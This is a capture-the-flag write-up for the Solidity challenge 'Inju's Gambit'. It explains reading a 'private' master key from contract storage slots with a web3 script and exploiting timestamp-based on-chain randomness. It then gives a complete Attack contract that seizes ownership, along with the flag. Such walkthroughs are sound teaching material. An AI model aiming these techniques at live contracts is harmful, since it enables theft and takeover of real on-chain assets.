# Inju's Gambit

> Inju owns all the things in the area, waiting for one worthy challenger to emerge.
>  Rumor said, that there many ways from many different angle to tackle Inju.
>  Are you the Challenger worthy to oppose him?

Attached files: [Setup.sol](./source/Setup.sol), [ChallengeManager.sol](./source/ChallengeManager.sol), [Privileged.sol](./source/Privileged.sol)

## Challenge Outline
As usual, the goal of the challenge is to make the isSolved function in the setup contract return true.
```solidity
function isSolved() public view returns(bool){
    return address(privileged.challengeManager()) == address(0);
}
```

## Approach
Our goal is to set the challengeManager address in the privileged contract to the null address (0x000...). I started looking though the Privileged.sol contract for a function that coudl accomplish this. Fortunately, the fireManager functions appears to do just that:
```solidity
function fireManager() public onlyOwner{
    challengeManager = address(0);
}
```
However, to call fireManager, we first need to become the owner of the privileged contract. The current owner is the contract that deployed it: the challenge manager contract. I then reviewed the challenge manager contract for a function that would either allow us to call fireManager or become the owner ourselves.
```solidity
function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
    if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
        privileged.setNewCasinoOwner(address(theChallenger));
    }
}
```
The challengeCurrentOwner function allows us to become the owner if we meet two conditions: being the chosen challenger and having the master key. 
### Obtaining the key
The `bytes32 private masterKey` means that the masterKey is a private variable and we cannot access it externally. Even though it is called private, it is still stored publicly on the blockchain, allowing us to read it from its storage slot. A contract's state variables are stored in storage slots and by reading these slots, we can find the value of the master key.
```python
from web3 import Web3

rpc_url = "http://45.32.119.201:44445/f03fa921-b78f-4d64-87b1-e25a5af93fd1"  # rpc endpoint
w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    print("Couldn't connect")
    exit(1)

def read_slot(address, slot):
    value = w3.eth.get_storage_at(address, slot)
    return value

contract_addr = "0x4635c4064F565f0a5ca43D4893a2a6977F2B2655"  # the address of the challengeManager contract
for x in range(10):
    key = read_slot(contract_addr, x)
    print(x, key, key.hex())
```
This is the Python script I used to read the first ten slots of the contract.
You can determine which slot a certain variable is stored in based on the order they are declared, but I was lazy and decided to just print them all out :P.  
Output:
```
0 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x92\xa4\x06\xa6i\xaf\xf94\xe2*n\xd5\xcel\xf5|\xa3\x1f5' 0000000000000000000000001f92a406a669aff934e22a6ed5ce6cf57ca31f35
1 b'INJUINJUINJUSUPERKEYKEYKEYKEYKEY' 494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559
2 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 0000000000000000000000000000000000000000000000000000000000000000
3 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\xcfh>\x96\xae\xe5\x06wow\x06\x97\x86\xaaz\xf0+\x03\x90' 000000000000000000000000f8cf683e96aee506776f77069786aa7af02b0390
4 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Ec\x91\x82D\xf4\x00\x00' 0000000000000000000000000000000000000000000000004563918244f40000
```
From the output, I think it is safe to assume that INJUINJUINJUSUPERKEYKEYKEYKEYKEY is our master key.

### Becoming the owner
After looking through the functions in ChallengeManager.sol, I noticed that the only function that would allow us to become the owner was the upgradeChallengerAttribute function. 
```solidity
function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
    ...
    uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

    if (gacha == 0){
        ...
    }else if (gacha == 1){
        if(privileged.getRequirmenets(challengerId).isRich == false){
            privileged.upgradeAttribute(challengerId, true, false, false, false);
        }else if(privileged.getRequirmenets(challengerId).isImportant == false){
            privileged.upgradeAttribute(challengerId, true, true, false, false);
        }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
            privileged.upgradeAttribute(challengerId, true, true, true, false);
        }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
            privileged.upgradeAttribute(challengerId, true, true, true, true);
            qualifiedChallengerFound = true;
            theChallenger = privileged.getRequirmenets(challengerId).challenger;
        }
    }
    ...
```
Calling this function four times when gacha is 1 will make us the challenger. To accomplish this, I wrote a smart contract that would only call upgradeChallengerAttribute if `uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4 == 1`. But first, the contract would need to become a challenger by sending 5 eth to the approach function.
```solidity
    function approach() public payable {
        if(msg.value != 5 ether){
            revert CM_NotTheCorrectValue();
        }
        if(approached[msg.sender] == true){
            revert CM_AlreadyApproached();
        }
        approached[msg.sender] = true;
        challenger.push(msg.sender);
        privileged.mintChallenger(msg.sender);
    }
```
This function will add our contract to the list of challengers. Since the setup contract created two challengers in its constructor, our contract's challenger id will be 3. 

## Putting it all together
Now that we have an idea of how to solve the challenge, we just need to write the contract. For most of the challenges in this CTF, I used the Remix IDE.

### Importing
```solidity
import "./Privileged.sol";
import "./ChallengeManager.sol";
import "./Setup.sol";
```
This part should be self explanatory. We are importing the other .sol files so that our contract will be able to interact with the other contracts.

### State variables
```solidity
    Setup public setup;
    Privileged public privileged;
    ChallengeManager public challengeManager;
```
These state variables will hold a reference to the instances of the other contracts.

### Constructor
```solidity
    constructor(address _setup) payable {
        require(msg.value == 5 ether, "Need 5 ETH");
        
        setup = Setup(_setup);
        challengeManager = ChallengeManager(setup.challengeManager());
        privileged = Privileged(setup.privileged());

        challengeManager.approach{value: 5 ether}();
    }
```
The constructor is a special function that is run once when the contract is deployed. In the constructor, I first require five ether to be sent along with the deployment for when we call approach. I define the setup with the address of the setup contract, which is passed in as _setup, and find the addresses of challengeManager and privileged through setup. Finally, I call approach with five ether, making our contract a challenger.

### Solve
```solidity
    function solve() public {
        uint256 gachaRoll = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
        bytes32 masterKey = 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559;

        require(gachaRoll == 1, "Try again");

        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        
        challengeManager.challengeCurrentOwner(masterKey);
        privileged.fireManager();
    }
```
Our solve function calculates the value of gacha and will revert, or cause the transaction to fail, if it is not 1. We will have to call the function again since if we use a loop, it will still be in the same transaction, and the block will still have the same timestamp, meaning our gacha will stay the same. If it is 1, we continue and call upgradeChallengerAttribute four times with the parameters 3 and 1. Three is the id of our contract, and the second attribute just has to be a valid id. We know that gacha will be always be 1 in these calls since the timestamp should stay the same within the same transaction. After we become the challenger, we can call challengeCurrentOwner with our master key and become the owner of privileged. Once we become the owner, we can fire the manager and solve the challenge!

## Attack Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Privileged.sol";
import "./ChallengeManager.sol";
import "./Setup.sol";

contract Attack {
    Setup public setup;
    Privileged public privileged;
    ChallengeManager public challengeManager;

    constructor(address _setup) payable {
        require(msg.value == 5 ether, "Need 5 ETH");
        
        setup = Setup(_setup);
        challengeManager = ChallengeManager(setup.challengeManager());
        privileged = Privileged(setup.privileged());

        challengeManager.approach{value: 5 ether}();
    }

    function solve() public {
        uint256 gachaRoll = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
        bytes32 masterKey = 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559;

        require(gachaRoll == 1, "Try again");

        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        
        challengeManager.challengeCurrentOwner(masterKey);
        privileged.fireManager();
    }
}
```

### Flag
`TCP1P{is_it_really_a_gambit_tho_its_not_that_hard}`



